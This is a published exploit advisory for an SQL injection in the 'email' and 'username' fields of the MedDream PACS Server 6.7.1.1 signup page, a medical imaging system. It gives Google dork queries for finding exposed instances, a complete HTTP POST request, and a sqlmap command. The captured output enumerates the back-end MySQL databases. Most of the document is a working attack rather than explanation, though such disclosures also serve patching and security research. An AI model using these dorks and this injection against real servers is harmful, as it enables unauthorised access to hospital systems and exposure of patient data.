@@ -1,0 +1,44 @@
+# Exploit Title: MedDream PACS Server Premium 6.7.1.1 - 'email' SQL Injection
+# Date: 2018-05-23
+# Software https://www.softneta.com/products/meddream-pacs-server/downloads.html
+# Version: MedDreamPACS Premium 6.7.1.1 
+# Exploit Author: Carlos Avila
+# Google Dork: inurl:Pacs/login.php, inurl:pacsone filetype:php home, inurl:pacsone filetype:php login
+# Category: webapps
+# Tested on: Windows
+# http://twitter.com/badboy_nt
+
+# Proof of Concept
+
+POST /Pacs/userSignup.php HTTP/1.1
+Host: 192.168.6.107
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.6.107/Pacs/userSignup.php?hostname=localhost&database=dicom
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 129
+Cookie: PHPSESSID=4l1c7irpgk1apcqk7ll9d89104
+Connection: close
+Upgrade-Insecure-Requests: 1
+DNT: 1
+
+hostname=localhost&database=dicom&username=hi&password=hi&firstname=jh&lastname=k23klk3l2&email=test@gmail.com&action=Sign+Up
+
+# Parameters affected: email, username
+
+root@deb-17-3:~/meddream# sqlmap -r sqli-signup -f -p email --dbms mysql --dbs 
+
+[10:23:16] [INFO] testing MySQL
+[10:23:16] [INFO] confirming MySQL
+[10:23:16] [INFO] the back-end DBMS is MySQL
+web application technology: Apache, PHP 7.0.30
+back-end DBMS: MySQL >= 5.0.0
+[10:23:16] [INFO] fetching database names
+[10:23:16] [INFO] used SQL query returns 2 entries
+[10:23:16] [INFO] resumed: information_schema
+[10:23:16] [INFO] resumed: dicom
+available databases [2]:
+[*] dicom
+[*] information_schema
